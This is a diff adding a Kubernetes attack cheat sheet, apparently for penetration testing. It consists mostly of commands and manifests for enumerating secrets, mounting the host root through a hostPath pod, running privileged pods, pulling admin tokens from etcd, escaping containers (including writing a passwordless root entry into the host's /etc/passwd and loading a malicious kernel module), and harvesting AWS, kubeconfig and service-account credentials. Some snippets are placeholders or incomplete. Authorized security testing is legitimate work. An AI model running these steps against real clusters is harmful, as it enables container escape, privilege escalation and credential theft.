@@ -1,0 +1,134 @@
+# Kubernetes Security Testing Payloads
+
+## API Server Attacks
+
+### Enumeration
+
+```bash
+# Get cluster info
+kubectl cluster-info
+kubectl get nodes
+
+# List pods
+kubectl get pods --all-namespaces
+
+# List secrets
+kubectl get secrets --all-namespaces
+```
+
+### Service Account Attacks
+
+```bash
+# Get default service account token
+kubectl get secret -n default
+
+# Use service account token
+curl -k https://kubernetes.default.svc/api/v1/namespaces/default/secrets
+```
+
+### Pod Escape
+
+```yaml
+# HostPath volume mount
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape
+spec:
+  containers:
+  - name: escape
+    image: nginx
+    volumeMounts:
+    - mountPath: /host
+      name: hostroot
+  volumes:
+  - name: hostroot
+    hostPath:
+      path: /
+```
+
+### Privilege Escalation
+
+```bash
+# Create privileged pod
+kubectl run --rm -it --image=alpine --privileged
+
+# Add to privileged container
+kubectl exec -it pod-name -- sh
+```
+
+## etcd Attacks
+
+```bash
+# Access etcd
+kubectl exec -it etcd-master -- etcdctl get /registry/secrets/default/admin-token
+
+# Get API server token from etcd
+etcdctl get /registry/secrets/kube-system/clusterrole-aggregation-controller-token
+```
+
+## Network Attacks
+
+### Service Discovery
+
+```bash
+# List services
+kubectl get svc --all-namespaces
+
+# Internal DNS
+dig kubernetes.default
+```
+
+### Network Policies Bypass
+
+```python
+# Test if network policies are enforced
+# Try accessing different namespaces
+# Test pod-to-pod communication
+```
+
+## Container Escape Techniques
+
+### mount escape
+
+```bash
+# If container has mount access
+mount /dev/sda1 /tmp/host
+cat /tmp/host/etc/passwd
+```
+
+### procfs escape
+
+```bash
+# If /proc is mounted read-write
+echo "root::0:0:root:/root:/bin/bash" > /proc/1/root/etc/passwd
+```
+
+### SYS_MODULE escape
+
+```bash
+# Load kernel module
+insmod /path/to/malicious.ko
+```
+
+## Credential Hunting
+
+```bash
+# Find AWS credentials
+env | grep -i aws
+cat /root/.aws/credentials
+
+# Find kubeconfig
+cat ~/.kube/config
+
+# Find service tokens
+ls -la /var/run/secrets/kubernetes.io/serviceaccount/
+```
+
+## Useful Commands
+
+| Command | Purpose |
+|---------|---------|
+| `kubectl auth can-i --list` | Check permissions |
+| `kubectl auth can-i create pods` | Test privilege |
+| `kubectl auth can-i --list --as=system:serviceaccount:default:default` | Check SA |
